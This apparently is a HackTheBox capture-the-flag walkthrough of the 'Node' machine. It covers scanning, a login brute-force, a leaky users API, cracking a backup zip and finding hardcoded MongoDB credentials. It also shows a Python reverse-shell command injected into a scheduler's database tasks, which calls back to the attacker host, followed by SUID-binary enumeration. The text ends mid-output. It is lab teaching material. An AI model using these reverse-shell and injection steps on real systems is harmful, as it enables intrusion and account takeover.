# Node | HackTheBox

### 1. Scan
```
─[us-dedivip-1]─[10.10.14.162]─[htb-jib1337@htb-eolbqcu7pq]─[~]
└──╼ [★]$ sudo nmap -A -p- -T4 10.129.71.65
Starting Nmap 7.80 ( https://nmap.org ) at 2020-12-29 02:16 UTC
Nmap scan report for 10.129.71.65
Host is up (0.22s latency).
Not shown: 65533 filtered ports
PORT     STATE SERVICE            VERSION
22/tcp   open  ssh                OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dc:5e:34:a6:25:db:43:ec:eb:40:f4:96:7b:8e:d1:da (RSA)
|   256 6c:8e:5e:5f:4f:d5:41:7d:18:95:d1:dc:2e:3f:e5:9c (ECDSA)
|_  256 d8:78:b8:5d:85:ff:ad:7b:e6:e2:b5:da:1e:52:62:36 (ED25519)
3000/tcp open  hadoop-tasktracker Apache Hadoop
| hadoop-datanode-info: 
|_  Logs: /login
| hadoop-tasktracker-info: 
|_  Logs: /login
|_http-title: MyPlace
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.10 - 4.11 (92%), Linux 3.12 (92%), Linux 3.13 (92%), Linux 3.13 or 4.2 (92%), Linux 3.16 (92%), Linux 3.16 - 4.6 (92%), Linux 3.2 - 4.9 (92%), Linux 3.8 - 3.11 (92%), Linux 4.2 (92%), Linux 4.4 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT       ADDRESS
1   221.35 ms 10.10.14.1
2   222.80 ms 10.129.71.65

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 215.25 seconds
```
The machine is running SSH and Apache Hardoop on port 3000.

### 2. Enumeration
Going to the HTTP site on the Hardoop port shows a budding social media website called "MyPlace". The front page shows there are three new members: tom, mark and rastating.  
Running a dirbust against the site can be done by specifying a bad string in the response since every request returns 200, but nothing of any real interest is discovered.  
There is a login page - I create a script to conduct a wordlist attack on the login form since there is no protection against bruteforce (see loginattack.py).
```bash
─[us-dedivip-1]─[10.10.14.162]─[htb-jib1337@htb-eolbqcu7pq]─[~/writeups/HackTheBox/HTB_Node]
└──╼ [★]$ ./loginattack.py 
[+] Attempting wordlist attack for tom...
Attempts for tom: 0
[+] Login - tom:spongebob
[+] Attempting wordlist attack for mark...
Attempts for mark: 0
Attempts for mark: 100
Attempts for mark: 200
Attempts for mark: 300
Attempts for mark: 400
Attempts for mark: 500
Attempts for mark: 600
Attempts for mark: 700
Attempts for mark: 800
Attempts for mark: 900
Attempts for mark: 1000
Attempts for mark: 1100
Attempts for mark: 1200
Attempts for mark: 1300
Attempts for mark: 1400
[+] Login - mark:snowflake
[+] Attempting wordlist attack for rastating...
Attempts for rastating: 0
Attempts for rastating: 100
Attempts for rastating: 200
Attempts for rastating: 300
Attempts for rastating: 400
Attempts for rastating: 500
...
```
Two sets of credentials are recovered: `tom:spongebob` and `mark:snowflake`.  
Logging in as these users gives only a single page indicating there is no functionality for non-admin users. From here it can be concluded that these users are a dead end.
  
Taking a look at the site in Burpsuite, the pages are retrieving information from several endpoints. One is used to the the list of latest users: `/api/users/latest`.  
By changing this to `/api/users` the response returns a list of users and their password hashes.
```bash
─[us-dedivip-1]─[10.10.14.162]─[htb-jib1337@htb-eolbqcu7pq]─[~/writeups/HackTheBox/HTB_Node]
└──╼ [★]$ curl --silent http://10.129.71.65:3000/api/users | jq
[
  {
    "_id": "59a7365b98aa325cc03ee51c",
    "username": "myP14ceAdm1nAcc0uNT",
    "password": "dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af",
    "is_admin": true
  },
  {
    "_id": "59a7368398aa325cc03ee51d",
    "username": "tom",
    "password": "f0e2e750791171b0391b682ec35835bd6a5c3f7c8d1d0191451ec77b4d75f240",
    "is_admin": false
  },
  {
    "_id": "59a7368e98aa325cc03ee51e",
    "username": "mark",
    "password": "de5a1adf4fedcce1533915edc60177547f1057b61b7119fd130e1f7428705f73",
    "is_admin": false
  },
  {
    "_id": "59aa9781cced6f1d1490fce9",
    "username": "rastating",
    "password": "5065db2df0d4ee53562c650c29bacf55b97e231e3fe88570abc9edd8b78ac2f0",
    "is_admin": false
  }
]
```
Searching online for the admin's hash completes a set of valid admin credentials: `myP14ceAdm1nAcc0uNT:manchester`.

### 3. Log in to the admin page
The admin's dashboard has a single link to download a backup.
```bash
divip-1]─[10.10.14.162]─[htb-jib1337@htb-gnmqkxd0jn]─[~/Downloads]
└──╼ [★]$ file myplace.backup 
myplace.backup: ASCII text, with very long lines, with no line terminators
```
The file's contents is base64 encoded.
```bash
─[us-dedivip-1]─[10.10.14.162]─[htb-jib1337@htb-gnmqkxd0jn]─[~/Downloads]
└──╼ [★]$ cat myplace.backup | base64 -d > backup.zip
─[us-dedivip-1]─[10.10.14.162]─[htb-jib1337@htb-gnmqkxd0jn]─[~/Downloads]
└──╼ [★]$ file backup.zip 
backup.zip: Zip archive data, at least v1.0 to extract
```
The zipfile has a password, but it does appear in a wordlist so it can be recovered.
```bash
─[us-dedivip-1]─[10.10.14.162]─[htb-jib1337@htb-gnmqkxd0jn]─[~/Downloads]
└──╼ [★]$ fcrackzip --dictionary -p rockyou.txt -u backup.zip 


PASSWORD FOUND!!!!: pw == magicword
```
The backup file can now be unzipped, which recovers the source code to the entire application.

### 4. Check out the source code
Install and run the code auditing in retire.js:
```bash─[us-dedivip-1]─[10.10.14.162]─[htb-jib1337@htb-afhzlzxoeo]─[~/var/www/myplace]
└──╼ [★]$ sudo npm install -g retire

added 43 packages, and audited 43 packages in 2s

3 packages are looking for funding
  run `npm fund` for details

found 0 vulnerabilities
npm notice 
npm notice New minor version of npm available! 7.1.0 -> 7.3.0
npm notice Changelog: https://github.com/npm/cli/releases/tag/v7.3.0
npm notice Run npm install -g npm@7.3.0 to update!
npm notice
─[us-dedivip-1]─[10.10.14.162]─[htb-jib1337@htb-afhzlzxoeo]─[~/var/www/myplace]
└──╼ [★]$ retire --colors
retire.js v2.2.4
Loading from cache: https://raw.githubusercontent.com/RetireJS/retire.js/master/repository/jsrepository.json
Loading from cache: https://raw.githubusercontent.com/RetireJS/retire.js/master/repository/npmrepository.json
/home/htb-jib1337/var/www/myplace/static/vendor/angular/angular-route.min.js
 ↳ angularjs 1.6.5
angularjs 1.6.5 has known vulnerabilities: severity: medium; summary: XSS may be triggered in AngularJS applications that sanitize user-controlled HTML snippets before passing them to JQLite methods like JQLite.prepend, JQLite.after, JQLite.append, JQLite.replaceWith, JQLite.append, new JQLite and angular.element., CVE: CVE-2020-7676; https://github.com/advisories/GHSA-5cp4-xmrw-59wf severity: medium; summary: angular.js prior to 1.8.0 allows cross site scripting. The regex-based input HTML replacement may turn sanitized code into unsanitized one., CVE: CVE-2020-7676; https://nvd.nist.gov/vuln/detail/CVE-2020-7676 severity: medium; summary: Prototype pollution; https://github.com/angular/angular.js/commit/726f49dcf6c23106ddaf5cfd5e2e592841db743a https://github.com/angular/angular.js/blob/master/CHANGELOG.md#179-pollution-eradication-2019-11-19 severity: low; summary: XSS through SVG if enableSvg is set; https://github.com/angular/angular.js/blob/master/CHANGELOG.md#169-fiery-basilisk-2018-02-02 https://vulnerabledoma.in/ngSanitize1.6.8_bypass.html
/home/htb-jib1337/var/www/myplace/static/vendor/angular/angular.min.js
 ↳ angularjs 1.6.5
angularjs 1.6.5 has known vulnerabilities: severity: medium; summary: XSS may be triggered in AngularJS applications that sanitize user-controlled HTML snippets before passing them to JQLite methods like JQLite.prepend, JQLite.after, JQLite.append, JQLite.replaceWith, JQLite.append, new JQLite and angular.element., CVE: CVE-2020-7676; https://github.com/advisories/GHSA-5cp4-xmrw-59wf severity: medium; summary: angular.js prior to 1.8.0 allows cross site scripting. The regex-based input HTML replacement may turn sanitized code into unsanitized one., CVE: CVE-2020-7676; https://nvd.nist.gov/vuln/detail/CVE-2020-7676 severity: medium; summary: Prototype pollution; https://github.com/angular/angular.js/commit/726f49dcf6c23106ddaf5cfd5e2e592841db743a https://github.com/angular/angular.js/blob/master/CHANGELOG.md#179-pollution-eradication-2019-11-19 severity: low; summary: XSS through SVG if enableSvg is set; https://github.com/angular/angular.js/blob/master/CHANGELOG.md#169-fiery-basilisk-2018-02-02 https://vulnerabledoma.in/ngSanitize1.6.8_bypass.html
/home/htb-jib1337/var/www/myplace/static/vendor/jquery/jquery.js
 ↳ jquery 1.12.4
jquery 1.12.4 has known vulnerabilities: severity: medium; issue: 2432, summary: 3rd party CORS request may execute, CVE: CVE-2015-9251; https://github.com/jquery/jquery/issues/2432 http://blog.jquery.com/2016/01/08/jquery-2-2-and-1-12-released/ https://nvd.nist.gov/vuln/detail/CVE-2015-9251 http://research.insecurelabs.org/jquery/test/ severity: medium; CVE: CVE-2015-9251, issue: 11974, summary: parseHTML() executes scripts in event handlers; https://bugs.jquery.com/ticket/11974 https://nvd.nist.gov/vuln/detail/CVE-2015-9251 http://research.insecurelabs.org/jquery/test/ severity: low; CVE: CVE-2019-11358, summary: jQuery before 3.4.0, as used in Drupal, Backdrop CMS, and other products, mishandles jQuery.extend(true, {}, ...) because of Object.prototype pollution; https://blog.jquery.com/2019/04/10/jquery-3-4-0-released/ https://nvd.nist.gov/vuln/detail/CVE-2019-11358 https://github.com/jquery/jquery/commit/753d591aea698e57d6db58c9f722cd0808619b1b severity: medium; CVE: CVE-2020-11022, summary: Regex in its jQuery.htmlPrefilter sometimes may introduce XSS; https://blog.jquery.com/2020/04/10/jquery-3-5-0-released/ severity: medium; CVE: CVE-2020-11023, summary: Regex in its jQuery.htmlPrefilter sometimes may introduce XSS; https://blog.jquery.com/2020/04/10/jquery-3-5-0-released/
/home/htb-jib1337/var/www/myplace/static/vendor/jquery/jquery.min.js
 ↳ jquery 1.12.4
jquery 1.12.4 has known vulnerabilities: severity: medium; issue: 2432, summary: 3rd party CORS request may execute, CVE: CVE-2015-9251; https://github.com/jquery/jquery/issues/2432 http://blog.jquery.com/2016/01/08/jquery-2-2-and-1-12-released/ https://nvd.nist.gov/vuln/detail/CVE-2015-9251 http://research.insecurelabs.org/jquery/test/ severity: medium; CVE: CVE-2015-9251, issue: 11974, summary: parseHTML() executes scripts in event handlers; https://bugs.jquery.com/ticket/11974 https://nvd.nist.gov/vuln/detail/CVE-2015-9251 http://research.insecurelabs.org/jquery/test/ severity: low; CVE: CVE-2019-11358, summary: jQuery before 3.4.0, as used in Drupal, Backdrop CMS, and other products, mishandles jQuery.extend(true, {}, ...) because of Object.prototype pollution; https://blog.jquery.com/2019/04/10/jquery-3-4-0-released/ https://nvd.nist.gov/vuln/detail/CVE-2019-11358 https://github.com/jquery/jquery/commit/753d591aea698e57d6db58c9f722cd0808619b1b severity: medium; CVE: CVE-2020-11022, summary: Regex in its jQuery.htmlPrefilter sometimes may introduce XSS; https://blog.jquery.com/2020/04/10/jquery-3-5-0-released/ severity: medium; CVE: CVE-2020-11023, summary: Regex in its jQuery.htmlPrefilter sometimes may introduce XSS; https://blog.jquery.com/2020/04/10/jquery-3-5-0-released/
/home/htb-jib1337/var/www/myplace/static/vendor/bootstrap/js/bootstrap.js
 ↳ bootstrap 3.3.7
bootstrap 3.3.7 has known vulnerabilities: severity: high; issue: 28236, summary: XSS in data-template, data-content and data-title properties of tooltip/popover, CVE: CVE-2019-8331; https://github.com/twbs/bootstrap/issues/28236 severity: medium; issue: 20184, summary: XSS in data-target property of scrollspy, CVE: CVE-2018-14041; https://github.com/twbs/bootstrap/issues/20184 severity: medium; issue: 20184, summary: XSS in collapse data-parent attribute, CVE: CVE-2018-14040; https://github.com/twbs/bootstrap/issues/20184 severity: medium; issue: 20184, summary: XSS in data-container property of tooltip, CVE: CVE-2018-14042; https://github.com/twbs/bootstrap/issues/20184
/home/htb-jib1337/var/www/myplace/static/vendor/bootstrap/js/bootstrap.min.js
 ↳ bootstrap 3.3.7
bootstrap 3.3.7 has known vulnerabilities: severity: high; issue: 28236, summary: XSS in data-template, data-content and data-title properties of tooltip/popover, CVE: CVE-2019-8331; https://github.com/twbs/bootstrap/issues/28236 severity: medium; issue: 20184, summary: XSS in data-target property of scrollspy, CVE: CVE-2018-14041; https://github.com/twbs/bootstrap/issues/20184 severity: medium; issue: 20184, summary: XSS in collapse data-parent attribute, CVE: CVE-2018-14040; https://github.com/twbs/bootstrap/issues/20184 severity: medium; issue: 20184, summary: XSS in data-container property of tooltip, CVE: CVE-2018-14042; https://github.com/twbs/bootstrap/issues/20184
```
None of these vulnerabilities are of interest.  
Manually checking the source code reveals some credentials which have been hardcoded:
```js
─[us-dedivip-1]─[10.10.14.32]─[htb-jib1337@htb-t9ycdo1if1]─[~/node/var/www/myplace]
└──╼ [★]$ cat app.js | head -n 20

const express     = require('express');
const session     = require('express-session');
const bodyParser  = require('body-parser');
const crypto      = require('crypto');
const MongoClient = require('mongodb').MongoClient;
const ObjectID    = require('mongodb').ObjectID;
const path        = require("path");
const spawn        = require('child_process').spawn;
const app         = express();
const url         = 'mongodb://mark:5AYRft73VtFpc84k@localhost:27017/myplace?authMechanism=DEFAULT&authSource=myplace';
const backup_key  = '45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474';
```
These credentials are `mark:5AYRft73VtFpc84k`.

### 5. Get a shell on the machine
These new creds can be used to access SSH.
```bash
─[us-dedivip-1]─[10.10.14.32]─[htb-jib1337@htb-t9ycdo1if1]─[~/node/var/www/myplace]
└──╼ [★]$ ssh mark@10.129.81.230
The authenticity of host '10.129.81.230 (10.129.81.230)' can't be established.
ECDSA key fingerprint is SHA256:I0Y7EMtrkyc9Z/92jdhXQen2Y8Lar/oqcDNLHn28Hbs.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.81.230' (ECDSA) to the list of known hosts.
mark@10.129.81.230's password: 

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.



              .-. 
        .-'``(|||) 
     ,`\ \    `-`.                 88                         88 
    /   \ '``-.   `                88                         88 
  .-.  ,       `___:      88   88  88,888,  88   88  ,88888, 88888  88   88 
 (:::) :        ___       88   88  88   88  88   88  88   88  88    88   88 
  `-`  `       ,   :      88   88  88   88  88   88  88   88  88    88   88 
    \   / ,..-`   ,       88   88  88   88  88   88  88   88  88    88   88 
     `./ /    .-.`        '88888'  '88888'  '88888'  88   88  '8888 '88888' 
        `-..-(   ) 
              `-` 




The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Last login: Wed Sep 27 02:33:14 2017 from 10.10.14.3
mark@node:~$ whoami
mark
```

### 6. Enumeration
- The user has no sudo perms  
There are three users on the machine:
```bash
mark@node:/home$ ls
frank  mark  tom
```
In the running processes, there is a mongo database running and two node applications.
```bash
mark@node:/home$ ps aux | grep mongo
mongodb   1425  0.4 12.4 286080 94336 ?        Ssl  11:31   0:06 /usr/bin/mongod --auth --quiet --config /etc/mongod.conf
mark      1804  0.0  0.1  14228   932 pts/0    S+   11:54   0:00 grep --color=auto mongo
mark@node:/home$ ps aux | grep node
tom       1426  0.0  6.7 1028148 51392 ?       Ssl  11:31   0:01 /usr/bin/node /var/www/myplace/app.js
tom       1431  0.0  5.1 1008056 38992 ?       Ssl  11:31   0:00 /usr/bin/node /var/scheduler/app.js
```
Looking at the scheduler, it is a small application that executes commands from it's mongodb database.
```bash
mark@node:/var/scheduler$ cat app.js 
const exec        = require('child_process').exec;
const MongoClient = require('mongodb').MongoClient;
const ObjectID    = require('mongodb').ObjectID;
const url         = 'mongodb://mark:5AYRft73VtFpc84k@localhost:27017/scheduler?authMechanism=DEFAULT&authSource=scheduler';

MongoClient.connect(url, function(error, db) {
  if (error || !db) {
    console.log('[!] Failed to connect to mongodb');
    return;
  }

  setInterval(function () {
    db.collection('tasks').find().toArray(function (error, docs) {
      if (!error && docs) {
        docs.forEach(function (doc) {
          if (doc) {
            console.log('Executing task ' + doc._id + '...');
            exec(doc.cmd);
            db.collection('tasks').deleteOne({ _id: new ObjectID(doc._id) });
          }
        });
      }
      else if (error) {
        console.log('Something went wrong: ' + error);
      }
    });
  }, 30000);

});
```
It happens to be reusing the same credentials as the myplace database, so we should be able to access both of them and check them out.

### 7. Look at the databases
The first database, "myplace", just has the previously-discovered credentials and nothing else.
```bash
mark@node:/home$ mongo -u mark -p 5AYRft73VtFpc84k myplace
MongoDB shell version: 3.2.16
connecting to: myplace
> db
myplace
> db.collection.count()
0
> db.getCollectionNames()
[ "users" ]
> db.users.find( {} )
{ "_id" : ObjectId("59a7365b98aa325cc03ee51c"), "username" : "myP14ceAdm1nAcc0uNT", "password" : "dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af", "is_admin" : true }
{ "_id" : ObjectId("59a7368398aa325cc03ee51d"), "username" : "tom", "password" : "f0e2e750791171b0391b682ec35835bd6a5c3f7c8d1d0191451ec77b4d75f240", "is_admin" : false }
{ "_id" : ObjectId("59a7368e98aa325cc03ee51e"), "username" : "mark", "password" : "de5a1adf4fedcce1533915edc60177547f1057b61b7119fd130e1f7428705f73", "is_admin" : false }
{ "_id" : ObjectId("59aa9781cced6f1d1490fce9"), "username" : "rastating", "password" : "5065db2df0d4ee53562c650c29bacf55b97e231e3fe88570abc9edd8b78ac2f0", "is_admin" : false }
```
The scheduler database has one collection called "tasks", which is empty.
```bash
mark@node:/home$ mongo -u mark -p 5AYRft73VtFpc84k scheduler
MongoDB shell version: 3.2.16
connecting to: scheduler
> db
scheduler
> db.collection.count()
0
> db.getCollectionNames()
[ "tasks" ]
> db.tasks.find( {} )
> 
```
I can attempt to add a command and see if it executes. First I try a bash reverse shell which fails, but I try something simpler - adding a file to /tmp which works.
```bash
> db.tasks.insert({"cmd":"echo test > /tmp/test.txt"})
WriteResult({ "nInserted" : 1 })
> db.tasks.find( {} )
{ "_id" : ObjectId("5ffee4ea0cb0aeb47b0cbf59"), "cmd" : "echo test > /tmp/test.txt" }
> exit
bye
mark@node:/var/scheduler$ ls /tmp/test.txt 
/tmp/test.txt
mark@node:/var/scheduler$ ls -l /tmp/test.txt 
-rw-r--r-- 1 tom tom 5 Jan 13 12:17 /tmp/test.txt
```
This confirms I have some degree of command execution as the tom user, now to figure out how to use it.

### 8. Lateral movement
Bash reverse shell didn't work, so I can try using a python command instead.
```bash
mark@node:~$ mongo -u mark -p 5AYRft73VtFpc84k scheduler
MongoDB shell version: 3.2.16
connecting to: scheduler
> db.tasks.find( {} )
> db.tasks.insert({"cmd":"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.3\",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"})
WriteResult({ "nInserted" : 1 })
> db.tasks.find( {} )
> 
```
Catch the shell in nc straight away.
```bash
─[us-dedivip-1]─[10.10.14.3]─[htb-jib1337@htb-8evlisvkfl]─[~]
└──╼ [★]$ nc -lvnp 9999
listening on [any] 9999 ...
connect to [10.10.14.3] from (UNKNOWN) [10.129.83.14] 35556
/bin/sh: 0: can't access tty; job control turned off
$ whoami
tom
$ python -c "import pty; pty.spawn('/bin/bash')"
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

tom@node:/$ ^Z
[1]+  Stopped                 nc -lvnp 9999
─[us-dedivip-1]─[10.10.14.3]─[htb-jib1337@htb-8evlisvkfl]─[~]
└──╼ [★]$ stty raw -echo
─[us-dedivip-1]─[10.10.14.3]─[htb-jib1337@htb-8evlisvkfl]─[~]
└──╼ [★]$ nc -lvnp 9999

<f+g+enter>

tom@node:/$ export TERM=xterm
tom@node:/$
```

### 9. Enumeration
Run linpeas:
```bash
tom@node:/tmp$ bash linpeas.sh
 Starting linpeas. Caching Writable Folders...
...
====================================( Basic information )=====================================
OS: Linux version 4.4.0-93-generic (buildd@lgw01-03) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.4) ) #116-Ubuntu SMP Fri Aug 11 21:17:51 UTC 2017
User & Groups: uid=1000(tom) gid=1000(tom) groups=1000(tom),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),115(lpadmin),116(sambashare),1002(admin)
...
[+] Backup files
-rw-r--r-- 1 root root 8710 Aug 12  2017 /lib/modules/4.4.0-93-generic/kernel/drivers/net/team/team_mode_activebackup.ko
-rw-r--r-- 1 root root 8990 Aug 12  2017 /lib/modules/4.4.0-93-generic/kernel/drivers/power/wm831x_backup.ko
-rw-r--r-- 1 root root 8710 Jul 18  2017 /lib/modules/4.4.0-87-generic/kernel/drivers/net/team/team_mode_activebackup.ko
-rw-r--r-- 1 root root 8990 Jul 18  2017 /lib/modules/4.4.0-87-generic/kernel/drivers/power/wm831x_backup.ko
-rw-r--r-- 1 root root 31600 Feb  9  2017 /usr/lib/open-vm-tools/plugins/vmsvc/libvmbackup.so
-rw-r--r-- 1 root root 0 Aug 12  2017 /usr/src/linux-headers-4.4.0-93-generic/include/config/net/team/mode/activebackup.h
-rw-r--r-- 1 root root 0 Aug 12  2017 /usr/src/linux-headers-4.4.0-93-generic/include/config/wm831x/backup.h
-rw-r--r-- 1 root root 190367 Aug 12  2017 /usr/src/linux-headers-4.4.0-93-generic/.config.old
-rw-r--r-- 1 root root 0 Jul 18  2017 /usr/src/linux-headers-4.4.0-87-generic/include/config/net/team/mode/activebackup.h
-rw-r--r-- 1 root root 0 Jul 18  2017 /usr/src/linux-headers-4.4.0-87-generic/include/config/wm831x/backup.h
-rw-r--r-- 1 root root 190367 Jul 18  2017 /usr/src/linux-headers-4.4.0-87-generic/.config.old
-rwsr-xr-- 1 root admin 16484 Sep  3  2017 /usr/local/bin/backup
-rw-r--r-- 1 root root 10542 Aug 29  2017 /usr/share/info/dir.old
-rwxr-xr-x 1 root root 226 Apr 14  2016 /usr/share/byobu/desktop/byobu.desktop.old
-rw-r--r-- 1 root root 665 Apr 16  2016 /usr/share/man/man8/vgcfgbackup.8.gz
-rw-r--r-- 1 root root 298768 Dec 29  2015 /usr/share/doc/manpages/Changes.old.gz
-rw-r--r-- 1 root root 7867 May  6  2015 /usr/share/doc/telnet/README.telnet.old.gz
-rw-r--r-- 1 root root 128 Aug 29  2017 /var/lib/sgml-base/supercatalog.old
-rw-r--r-- 1 root root 20 Feb  9  2017 /etc/vmware-tools/tools.conf.old
-rw-r--r-- 1 root root 610 Aug 29  2017 /etc/xml/catalog.old
-rw-r--r-- 1 root root 673 Aug 29  2017 /etc/xml/xml-core.xml.old
```
For "backup files", there is a binary, `/usr/local/bin/backup`, that is executable by the "admin" group that the current user is in. This binary was referenced in a myplace API.
```js
  app.get('/api/admin/backup', function (req, res) {
    if (req.session.user && req.session.user.is_admin) {
      var proc = spawn('/usr/local/bin/backup', ['-q', backup_key, __dirname ]);
      var backup = '';

      proc.on("exit", function(exitCode) {
        res.header("Content-Type", "text/plain");
        res.header("Content-Disposition", "attachment; filename=myplace.backup");
        res.send(backup);
      });

      proc.stdout.on("data", function(chunk) {
        backup += chunk;
      });

      proc.stdout.on("end", function() {
      });
    }
    else {
      res.send({
        authenticated: false
      });
    }
  });
```
It can also be seen that this binary has the suid bit set.
```bash
tom@node:/tmp$ ls -l $(which backup)
-rwsr-xr-- 1 root admin 16484 Sep  3  2017 /usr/local/bin/backup
```

### 10. Examine the binary
In the api that was used previous to get the myplace backup, the binary is called like so:
`/usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 /var/www/myplace`.
This returns the files in that directory in a base64-encoded zip.
By doing strace on the binary, I can find where the key is stored.
```bash
tom@node:/tmp$ strace backup a b c
execve("/usr/local/bin/backup", ["backup", "a", "b", "c"], [/* 15 vars */]) = 0
...
open("/etc/myplace/keys", O_RDONLY)     = 4
```
The contents of this file is:
```bash
tom@node:/tmp$ cat /etc/myplace/keys
a01a6aa5aaf1d7729f35c8278daae30f8a988257144c003f8b12c5aec39bc508
45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474
3de811f4ab2b7543eaf45df611c2dd2541a5fc5af601772638b81dce6852d110
```
The middle key is for /var/www/myplace, but there are two other keys in the file. Turns out the keys are interchangable so you can use any of them to get the zipfile out.
Examining the strings in the binary shows that the zip files are always encrypted with the password "magicword".
```bash
─[us-dedivip-1]─[10.10.14.3]─[htb-jib1337@htb-8evlisvkfl]─[~/writeups/HackTheBox/HTB_Node]
└──╼ [★]$ rabin2 -z backup 
[Strings]
nth paddr      vaddr      len  size section type    string
――――――――――――――――――――――――――――――――――――――――――――――――――――――――――
0   0x00001340 0x08049340 5    6    .rodata ascii   \e[37m
1   0x00001346 0x08049346 5    6    .rodata ascii   \e[33m
2   0x0000134c 0x0804934c 12   13   .rodata ascii    %s[!]%s %s\n
3   0x00001359 0x08049359 5    6    .rodata ascii   \e[32m
4   0x0000135f 0x0804935f 12   13   .rodata ascii    %s[+]%s %s\n
5   0x0000136c 0x0804936c 31   32   .rodata ascii    %s[+]%s Starting archiving %s\n
6   0x00001390 0x08049390 68   69   .rodata ascii   \n\n\n             ____________________________________________________
7   0x000013d8 0x080493d8 66   67   .rodata ascii               /                                                    \
8   0x0000141c 0x0804941c 67   68   .rodata ascii              |    _____________________________________________     |
9   0x00001460 0x08049460 67   68   .rodata ascii              |   |                                             |    |
10  0x000014a4 0x080494a4 67   68   .rodata ascii              |   |             Secure Backup v1.0              |    |
11  0x000014e8 0x080494e8 67   68   .rodata ascii              |   |_____________________________________________|    |
12  0x0000152c 0x0804952c 67   68   .rodata ascii              |                                                      |
13  0x00001570 0x08049570 67   68   .rodata ascii               \_____________________________________________________/
14  0x000015b4 0x080495b4 60   61   .rodata ascii                      \_______________________________________/
15  0x000015f4 0x080495f4 63   64   .rodata ascii                   _______________________________________________
16  0x00001634 0x08049634 66   67   .rodata ascii                _-'    .-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.  --- `-_
17  0x00001678 0x08049678 69   70   .rodata ascii             _-'.-.-. .---.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.--.  .-.-.`-_
18  0x000016c0 0x080496c0 72   73   .rodata ascii          _-'.-.-.-. .---.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-`__`. .-.-.-.`-_
19  0x0000170c 0x0804970c 75   76   .rodata ascii       _-'.-.-.-.-. .-----.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-----. .-.-.-.-.`-_
20  0x00001758 0x08049758 78   79   .rodata ascii    _-'.-.-.-.-.-. .---.-. .-----------------------------. .-.---. .---.-.-.-.`-_
21  0x000017a8 0x080497a8 79   80   .rodata ascii   :-----------------------------------------------------------------------------:
22  0x000017f8 0x080497f8 81   82   .rodata ascii   `---._.-----------------------------------------------------------------._.---'\n\n
23  0x0000184c 0x0804984c 21   22   .rodata ascii   Could not open file\n\n
24  0x00001864 0x08049864 22   23   .rodata ascii   Validated access token
25  0x0000187c 0x0804987c 42   43   .rodata ascii   Ah-ah-ah! You didn't say the magic word!\n\n
26  0x000018ac 0x080498ac 35   36   .rodata ascii   Finished! Encoded backup is below:\n
27  0x000018d0 0x080498d0 1524 1525 .rodata ascii   UEsDBDMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAcm9vdC50eHQBmQcAAgBBRQEIAEbBKBl0rFrayqfbwJ2YyHunnYq1Za6G7XLo8C3RH/hu0fArpSvYauq4AUycRmLuWvPyJk3sF+HmNMciNHfFNLD3LdkGmgwSW8j50xlO6SWiH5qU1Edz340bxpSlvaKvE4hnK/oan4wWPabhw/2rwaaJSXucU+pLgZorY67Q/Y6cfA2hLWJabgeobKjMy0njgC9c8cQDaVrfE/ZiS1S+rPgz/e2Pc3lgkQ+lAVBqjo4zmpQltgIXauCdhvlA1Pe/BXhPQBJab7NVF6Xm3207EfD3utbrcuUuQyF+rQhDCKsAEhqQ+Yyp1Tq2o6BvWJlhtWdts7rCubeoZPDBD6Mejp3XYkbSYYbzmgr1poNqnzT5XPiXnPwVqH1fG8OSO56xAvxx2mU2EP+Yhgo4OAghyW1sgV8FxenV8p5c+u9bTBTz/7WlQDI0HUsFAOHnWBTYR4HTvyi8OPZXKmwsPAG1hrlcrNDqPrpsmxxmVR8xSRbBDLSrH14pXYKPY/a4AZKO/GtVMULlrpbpIFqZ98zwmROFstmPl/cITNYWBlLtJ5AmsyCxBybfLxHdJKHMsK6Rp4MO+wXrd/EZNxM8lnW6XNOVgnFHMBsxJkqsYIWlO0MMyU9L1CL2RRwm2QvbdD8PLWA/jp1fuYUdWxvQWt7NjmXo7crC1dA0BDPg5pVNxTrOc6lADp7xvGK/kP4F0eR+53a4dSL0b6xFnbL7WwRpcF+Ate/Ut22WlFrg9A8gqBC8Ub1SnBU2b93ElbG9SFzno5TFmzXk3onbLaaEVZl9AKPA3sGEXZvVP+jueADQsokjJQwnzg1BRGFmqWbR6hxPagTVXBbQ+hytQdd26PCuhmRUyNjEIBFx/XqkSOfAhLI9+Oe4FH3hYqb1W6xfZcLhpBs4Vwh7t2WGrEnUm2/F+X/OD+s9xeYniyUrBTEaOWKEv2NOUZudU6X2VOTX6QbHJryLdSU9XLHB+nEGeq+sdtifdUGeFLct+Ee2pgR/AsSexKmzW09cx865KuxKnR3yoC6roUBb30Ijm5vQuzg/RM71